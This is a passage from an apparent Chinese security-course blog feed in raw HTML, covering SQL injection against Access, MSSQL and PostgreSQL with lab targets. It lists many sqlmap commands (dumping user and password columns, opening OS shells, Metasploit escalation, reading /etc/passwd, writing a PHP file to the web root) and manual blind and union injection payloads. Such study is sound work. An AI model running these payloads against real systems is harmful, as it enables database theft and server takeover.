class="hljs-operator">/</span>test.php?p<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-operator">-</span>b <span class="hljs-comment">--dump -C &quot;user,pass&quot;  -v 1 --exclude-sysdbs </span><br><span class="hljs-number">5.</span><span class="hljs-operator">/</span>sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxxxx.com<span class="hljs-operator">/</span>test.php?p<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-operator">-</span>b <span class="hljs-comment">--sql-shell -v 2 </span><br><span class="hljs-number">6.</span><span class="hljs-operator">/</span>sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxxxx.com<span class="hljs-operator">/</span>test.php?p<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-operator">-</span>b <span class="hljs-comment">--file-read &quot;c:\boot.ini&quot; -v 2 </span><br><span class="hljs-number">7.</span><span class="hljs-operator">/</span>sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxxxx.com<span class="hljs-operator">/</span>test.php?p<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-operator">-</span>b <span class="hljs-comment">--file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 </span><br><span class="hljs-number">8.</span><span class="hljs-operator">/</span>sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxxxx.com<span class="hljs-operator">/</span>test.php?p<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-operator">-</span>b <span class="hljs-comment">--os-cmd &quot;id&quot; -v 1 </span><br><span class="hljs-number">9.</span><span class="hljs-operator">/</span>sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxxxx.com<span class="hljs-operator">/</span>test.php?p<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-operator">-</span>b <span class="hljs-comment">--os-shell --union-use -v 2 </span><br><span class="hljs-number">10.</span><span class="hljs-operator">/</span>sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxxxx.com<span class="hljs-operator">/</span>test.php?p<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-operator">-</span>b <span class="hljs-comment">--os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 </span><br><span class="hljs-number">11.</span><span class="hljs-operator">/</span>sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxxxx.com<span class="hljs-operator">/</span>test.php?p<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-operator">-</span>b <span class="hljs-comment">--os-pwn --msf-path=/opt/framework/msf3 -v 1 </span><br><span class="hljs-number">12.</span><span class="hljs-operator">/</span>sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxxxx.com<span class="hljs-operator">/</span>test.php?p<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-operator">-</span>b <span class="hljs-comment">--os-bof --msf-path=/opt/framework/msf3 -v 1 </span><br><span class="hljs-number">13.</span><span class="hljs-operator">/</span>sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxxxx.com<span class="hljs-operator">/</span>test.php?p<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-comment">--reg-add --reg-key=&quot;HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1 </span><br><span class="hljs-number">14.</span><span class="hljs-operator">/</span>sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxxxx.com<span class="hljs-operator">/</span>test.php?p<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-operator">-</span>b <span class="hljs-comment">--eta </span><br><span class="hljs-number">15.</span><span class="hljs-operator">/</span>sqlmap.py <span class="hljs-operator">-</span>u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; <span class="hljs-operator">-</span>p id <span class="hljs-comment">--prefix &quot;&#x27;)&quot; --suffix &quot;AND (&#x27;abc&#x27;=&#x27;abc&quot;</span><br><span class="hljs-number">16.</span><span class="hljs-operator">/</span>sqlmap.py <span class="hljs-operator">-</span>u &quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot; <span class="hljs-comment">--auth-type Basic --auth-cred &quot;testuser:testpass&quot;</span><br><span class="hljs-number">17.</span><span class="hljs-operator">/</span>sqlmap.py <span class="hljs-operator">-</span>l burp.log <span class="hljs-comment">--scope=&quot;(www)?\.target\.(com|net|org)&quot;</span><br><span class="hljs-number">18.</span><span class="hljs-operator">/</span>sqlmap.py <span class="hljs-operator">-</span>u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; <span class="hljs-comment">--tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 </span><br><span class="hljs-number">19.</span><span class="hljs-operator">/</span>sqlmap.py <span class="hljs-operator">-</span>u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; <span class="hljs-comment">--sql-query &quot;SELECT &#x27;foo&#x27;&quot; -v 1 </span><br><span class="hljs-number">20.</span><span class="hljs-operator">/</span>sqlmap.py <span class="hljs-operator">-</span>u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; <span class="hljs-comment">--common-tables -D testdb --banner </span><br><span class="hljs-number">21.</span><span class="hljs-operator">/</span>sqlmap.py <span class="hljs-operator">-</span>u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; <span class="hljs-comment">--cookie=&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot; --string=&#x27;xx&#x27; --dbs --level=3 -p &quot;uid&quot;</span><br><br>简单的注入流程 :<br><span class="hljs-number">1.</span>读取数据库版本，当前用户，当前数据库 <br>sqlmap <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxxxx.com<span class="hljs-operator">/</span>test.php?p<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-operator">-</span>f <span class="hljs-operator">-</span>b <span class="hljs-comment">--current-user --current-db -v 1 </span><br><span class="hljs-number">2.</span>判断当前数据库用户权限 <br>sqlmap <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxxxx.com<span class="hljs-operator">/</span>test.php?p<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-comment">--privileges -U 用户名 -v 1 </span><br>sqlmap <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxxxx.com<span class="hljs-operator">/</span>test.php?p<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-comment">--is-dba -U 用户名 -v 1 </span><br><span class="hljs-number">3.</span>读取所有数据库用户或指定数据库用户的密码 <br>sqlmap <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxxxx.com<span class="hljs-operator">/</span>test.php?p<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-comment">--users --passwords -v 2 </span><br>sqlmap <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxxxx.com<span class="hljs-operator">/</span>test.php?p<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-comment">--passwords -U root -v 2 </span><br><span class="hljs-number">4.</span>获取所有数据库 <br>sqlmap <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxxxx.com<span class="hljs-operator">/</span>test.php?p<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-comment">--dbs -v 2 </span><br><span class="hljs-number">5.</span>获取指定数据库中的所有表 <br>sqlmap <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxxxx.com<span class="hljs-operator">/</span>test.php?p<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-comment">--tables -D mysql -v 2 </span><br><span class="hljs-number">6.</span>获取指定数据库名中指定表的字段 <br>sqlmap <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxxxx.com<span class="hljs-operator">/</span>test.php?p<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-comment">--columns -D mysql -T users -v 2 </span><br><span class="hljs-number">7.</span>获取指定数据库名中指定表中指定字段的数据 <br>sqlmap <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxxxx.com<span class="hljs-operator">/</span>test.php?p<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-comment">--dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2 </span><br><span class="hljs-number">8.</span>file<span class="hljs-operator">-</span>read读取web文件 <br>sqlmap <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxxxx.com<span class="hljs-operator">/</span>test.php?p<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-comment">--file-read &quot;/etc/passwd&quot; -v 2 </span><br><span class="hljs-number">9.</span>file<span class="hljs-operator">-</span>write写入文件到web <br>sqlmap <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxxxx.com<span class="hljs-operator">/</span>test.php?p<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-comment">--file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：</span><br></code></pre></td></tr></table></figure><h1 id="2、Access注入"><a href="#2、Access注入" class="headerlink" title="2、Access注入"></a>2、Access注入</h1><p>Access数据库的组成（相比于MySQL等数据库，Access数据库没有数据库这一层，相当于每个网站的数据库都是独立的，没有跨库注入，只能暴力破解）：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">Access</span>数据库：<br>表名：<br>列名：<br>数据：<br><br>MySQL数据库：<br>数据库名：<br>表名：<br>列名:<br>数据：<br></code></pre></td></tr></table></figure><p>access 数据库都是存放在网站目录下，后缀格式为 mdb，accdb等可以通过一些暴库手段、目录猜解等直接下载数据库，</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">access</span>无法使用： <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>格式，<br><br>必须指定要从哪个表中查询，例如：<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span><br></code></pre></td></tr></table></figure><p><strong>access三大攻击手法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.access注入攻击片段-联合查询法<br>2.access注入攻击片段-逐字猜解法<br>3.工具类的使用注入（推荐）<br></code></pre></td></tr></table></figure><p><strong>Access注入攻击方式</strong></p><p>主要有：union 注入、http header 注入、偏移注入等</p><h2 id="EXISTS-运算符"><a href="#EXISTS-运算符" class="headerlink" title="EXISTS 运算符"></a>EXISTS 运算符</h2><p>EXISTS 运算符用于判断查询子句是否有记录，如果有一条或多条记录存在返回 <strong>True</strong>，否则返回 False。</p><h3 id="SQL-EXISTS-语法"><a href="#SQL-EXISTS-语法" class="headerlink" title="SQL EXISTS 语法"></a>SQL EXISTS 语法</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column_name(s)<br><span class="hljs-keyword">FROM</span> table_name<br><span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">EXISTS</span><br>(<span class="hljs-keyword">SELECT</span> column_name <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">condition</span>);<br></code></pre></td></tr></table></figure><h2 id="Access数据库中的函数"><a href="#Access数据库中的函数" class="headerlink" title="Access数据库中的函数"></a>Access数据库中的函数</h2><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-keyword">select</span> <span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;string&quot;</span>)        查询给定字符串的长度<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">asc</span>(<span class="hljs-string">&quot;a&quot;</span>)             查询给定字符串的ascii值<br>top  n                      查询前n条记录<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">mid</span>(<span class="hljs-string">&quot;string&quot;</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)    查询给定字符串从指定索引开始的长度<br></code></pre></td></tr></table></figure><pre><code class="hljs">mid(string,start,length) 这个用来截取字符串的string是要截取的字符串start是截取的字符串开始索引length是要截取的字符串长度 </code></pre><h2 id="2-1-盲注Access数据库"><a href="#2-1-盲注Access数据库" class="headerlink" title="2.1 盲注Access数据库"></a>2.1 <strong>盲注Access数据库</strong></h2><p>Access数据库特有的表是：<strong>msysobjects</strong>  ，所以可以用它来判断是否是Access数据库</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> msysobjects)  <span class="hljs-meta">#如果这条语句正确，说明是Access数据库</span><br></code></pre></td></tr></table></figure><p>Access没有数据库的概念，所有的表都是在同一个数据库下。所以，我们不用去判断当前的数据库名，并且access数据库中也不存在 database() 函数。</p><p>对于判断存在哪些表，只能用以下枚举的方法来猜测是否存在某某表。 </p><p>判断存在sql注入后，判断是否存在admin表，如果存在，正常查询，如果不存在，报语法错误。然后通过<strong>枚举表名爆破</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span>* <span class="hljs-keyword">from</span>  <span class="hljs-keyword">admin</span>)<br></code></pre></td></tr></table></figure><p>猜测字段也是一样，只能通过枚举来猜测 </p><p>判断有admin表后，再<strong>判断admin表有多少列</strong>，假如1-10正常查询，11列报语法报错，那说明有10列</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">10</span>)<br></code></pre></td></tr></table></figure><p>判断出存在的列数后，再<strong>判断具体的列名</strong>。以下语句判断是否存在name列，如果存在，正常查询，如果不存在，则报语法错误。然后再通过枚举列名爆破</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>)<br></code></pre></td></tr></table></figure><p>猜测完表名和字段名后，我们就看看这个<strong>表里面有多少行数据</strong> ，如果&gt;99查询正确，&gt;100查询错误(这里是查询错误，而不是语法错误)，说明有100行数据</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">and (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*) <span class="hljs-keyword">from</span> information)&gt;<span class="hljs-number">100</span><br></code></pre></td></tr></table></figure><p>然后在猜测每个字段具体的数据了 </p><p>access数据库中没有 limit，就不能限制查询出来的行数。但是我们可以使用top命令，top 1是将查询的所有数据只显示第一行，所以 top3就是显示查询出来的前三行数据了</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">猜测<span class="hljs-keyword">admin</span>列的第一个数据的长度，如果大于<span class="hljs-number">5</span>查询不出数据，大于<span class="hljs-number">4</span>正常，说明<span class="hljs-keyword">admin</span>列的第一个数据长度是<span class="hljs-number">5</span><br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> len(<span class="hljs-keyword">admin</span>)<span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>)&gt;<span class="hljs-number">5</span><br><br>猜测<span class="hljs-keyword">admin</span>列的第一行数据的第一个字符的ascii码值，如果大于<span class="hljs-number">97</span>查询不出数据，大于<span class="hljs-number">96</span>正常，说明<span class="hljs-keyword">admin</span>列的第一行数据的第一个字符的ascii值是<span class="hljs-number">97</span><br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-keyword">asc</span>(mid(<span class="hljs-keyword">admin</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>)&gt;<span class="hljs-number">97</span> <br>第一行数据的第二个字符<br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-keyword">asc</span>(mid(<span class="hljs-keyword">admin</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>))<span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>)&gt;<span class="hljs-number">97</span> <br><br>从第二行开始，查询数据就得用另外的语句了,因为这里的top只能显示查询前几条数据，所以我们得用联合查询，先查询前两条，然后倒序，然后在找出第一条，这就是第二条数据。<br>查询第二行<span class="hljs-keyword">admin</span>列的长度<br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> len(<span class="hljs-keyword">admin</span>)  <span class="hljs-keyword">from</span> ( <span class="hljs-keyword">select</span> top <span class="hljs-number">2</span> * <span class="hljs-keyword">from</span> information <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> id)  <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> id <span class="hljs-keyword">desc</span>)&gt;<span class="hljs-number">55</span><br>下面是查询第<span class="hljs-number">2</span>条数据的第<span class="hljs-number">3</span>个字符<br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-keyword">asc</span>(mid(<span class="hljs-keyword">admin</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>))  <span class="hljs-keyword">from</span> ( <span class="hljs-keyword">select</span> top <span class="hljs-number">2</span> * <span class="hljs-keyword">from</span> information <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> id)  <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> id <span class="hljs-keyword">desc</span>)&gt;<span class="hljs-number">55</span><br>查询第三条数据的第<span class="hljs-number">4</span>个字符<br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-keyword">asc</span>(mid(<span class="hljs-keyword">admin</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>))  <span class="hljs-keyword">from</span> ( <span class="hljs-keyword">select</span> top <span class="hljs-number">3</span> * <span class="hljs-keyword">from</span> information <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> id)  <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> id <span class="hljs-keyword">desc</span>)&gt;<span class="hljs-number">55</span><br></code></pre></td></tr></table></figure><p>注：在access中，中文也可以用<strong>asc函数</strong>来表示，</p><p>例如：asc(mid(“中国”,1)) 表示 中 字的ascii值，可以用 <strong>chr</strong> （将ascll码变为对应值）来逆向得出值</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">asc</span><span class="hljs-params">(<span class="hljs-string">&quot;中&quot;</span>)</span></span> = -<span class="hljs-number">10544</span><br><span class="hljs-function"><span class="hljs-title">chr</span><span class="hljs-params">(-<span class="hljs-number">10544</span>)</span></span> = 中<br></code></pre></td></tr></table></figure><p>​</p><h2 id="2-2-Sqlmap注入Access数据库"><a href="#2-2-Sqlmap注入Access数据库" class="headerlink" title="2.2 Sqlmap注入Access数据库"></a>2.2 Sqlmap注入Access数据库</h2><p>爆出access数据库存在的表，只能利用枚举的方式爆破。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sqlmap -u <span class="hljs-string">&quot;xxx&quot;</span>  <span class="hljs-comment">--tables</span><br></code></pre></td></tr></table></figure><p>第一步问我们是否使用公共的库去爆破，我们选择：Y；</p><p>第二步选择默认的库文件：1 </p><p>第三步选择线程数：10</p><p>可以看出爆出了两个数据表：admin 、 specialty</p><p>爆出admin数据库中的列名</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">sqlmap -u <span class="hljs-string">&quot;xxx&quot;</span> -<span class="hljs-built_in">T</span> admin --<span class="hljs-built_in">columns</span><br></code></pre></td></tr></table></figure><p>意思和上一步也是一样的。 </p><p>爆出admin表下username列的所有数据</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">sqlmap -u <span class="hljs-string">&quot;xxx&quot;</span> -T <span class="hljs-literal">admin</span> -C username --dump-<span class="hljs-literal">all</span><br></code></pre></td></tr></table></figure><h1 id="3-sqlSever数据库-注入（msSQL）"><a href="#3-sqlSever数据库-注入（msSQL）" class="headerlink" title="3 sqlSever数据库 注入（msSQL）"></a>3 sqlSever数据库 注入（msSQL）</h1><p>参考链接：</p><p><a href="https://www.cnblogs.com/xishaonian/p/6173644.html">https://www.cnblogs.com/xishaonian/p/6173644.html</a></p><p><img src="https://s2.loli.net/2022/11/25/8MBGvgPzr6Wo7km.png" alt="image-20221112195346808"></p><h2 id="3-1-墨者靶场sqlsever"><a href="#3-1-墨者靶场sqlsever" class="headerlink" title="3.1 墨者靶场sqlsever"></a>3.1 墨者靶场sqlsever</h2><img src="https://s2.loli.net/2022/11/25/S7AUP1OGpJYmLeq.png" alt="image-20221112200120511" style="zoom:33%;" /><p>1、判断数据库类型：</p><p><img src="https://s2.loli.net/2022/11/25/Nx6P1ojrEJTtYev.png" alt="image-20221112200210487"></p><p>如果是mssql就正常显示</p><p>2、判断数据库版本</p><p><img src="https://s2.loli.net/2022/11/25/wuzMGsHp3JNjBQI.png" alt="image-20221112200300428"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-built_in">substring</span>((<span class="hljs-keyword">select</span> @<span class="hljs-variable">@version</span>),<span class="hljs-number">22</span>,<span class="hljs-number">4</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;2005&#x27;</span><span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p>适用于无回显模式，后面的2005就是数据库版本，返回正常就是2005的复制代码第一条语句执行</p><p>如果是2005版就有回显</p><h1 id="4、postgreSQL"><a href="#4、postgreSQL" class="headerlink" title="4、postgreSQL"></a>4、postgreSQL</h1><p>链接：</p><p><a href="https://www.cnblogs.com/yilishazi/p/14710349.html">https://www.cnblogs.com/yilishazi/p/14710349.html</a></p><p>常见函数（整体）：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> version() #查看版本信息<br>#查看用户<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span>;<br><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">current_user</span>;<br><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">session_user</span>;<br><span class="hljs-keyword">SELECT</span> usename <span class="hljs-keyword">FROM</span> pg_user;#这里是usename不是username<br><span class="hljs-keyword">SELECT</span> getpgusername();<br>#查看当前数据库<br><span class="hljs-keyword">SELECT</span> current_database()<span class="hljs-number">10</span> CURRENT_SCHEMA()  查看当前数据库    sqlmap跑注入使用此函数。<br></code></pre></td></tr></table></figure><h2 id="4-1-墨者postgresql"><a href="#4-1-墨者postgresql" class="headerlink" title="4.1 墨者postgresql"></a>4.1 墨者postgresql</h2><img src="https://s2.loli.net/2022/11/25/k41DJPl2sHA5Qoe.png" alt="image-20221112210842964" style="zoom:33%;" /><p><strong>首先查询字段数：</strong></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>猜出有四个四段</p><p><strong>看回显</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">union</span> <span class="hljs-literal">select</span> <span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span><br></code></pre></td></tr></table></figure><p>注意要打逗号，</p><p><img src="https://s2.loli.net/2022/11/25/UxPYyoum7aj5LCG.png" alt="image-20221112211058412"></p><p><img src="https://s2.loli.net/2022/11/25/jAMw562xRLhUN4y.png" alt="image-20221112211110862"></p><p><strong>爆库</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;1&#x27;</span>,(<span class="hljs-keyword">select</span> current_database()),<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span> <br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/11/25/654fWjrh3H78zdG.png" alt="image-20221112211220684"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小迪-day15(Oracle，MongoDB、access、msSQL、postgresql注入)</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>小迪-day16（报错注入，延时、布尔盲注）</title>
    <link href="/2023/08/24/%E5%B0%8F%E8%BF%AA-day16%EF%BC%88%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%BB%B6%E6%97%B6%E3%80%81%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%89/"/>
    <url>/2023/08/24/%E5%B0%8F%E8%BF%AA-day16%EF%BC%88%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%BB%B6%E6%97%B6%E3%80%81%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">当进行<span class="hljs-keyword">SQL</span>注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是：<br><span class="hljs-number">1</span>、<span class="hljs-keyword">SQL</span>语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作<br><span class="hljs-number">2</span>、或者是网站没有将结果进行显示<br><br>同时作为手工注入时，提前了解或预知其<span class="hljs-keyword">SQL</span>语句大概写法也能更好的选择对应的注入语句。<br>(知道是什么类型语句，如：<span class="hljs-keyword">insert</span>、<span class="hljs-keyword">update</span>)<br></code></pre></td></tr></table></figure><p>我们可以通过以上查询方式与网站应用的关系</p><p>注入点产生地方或应用猜测到对方的 SQL 查询方式 </p><p><strong>通过功能判断SQL语句类型：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 